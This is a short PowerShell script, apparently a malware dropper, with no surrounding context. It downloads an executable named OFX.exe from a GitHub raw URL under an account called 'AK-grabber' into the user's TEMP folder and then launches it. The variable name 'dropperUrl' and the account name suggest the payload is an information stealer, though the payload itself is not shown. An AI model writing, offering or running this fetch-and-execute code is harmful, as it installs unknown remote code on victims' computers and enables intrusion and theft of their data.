$dropperUrl = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/refs/heads/main/OFX.exe"
$tempPath = "$env:TEMP\OFX.exe"
Invoke-WebRequest -Uri $dropperUrl -OutFile $tempPath
Start-Process -FilePath $tempPath
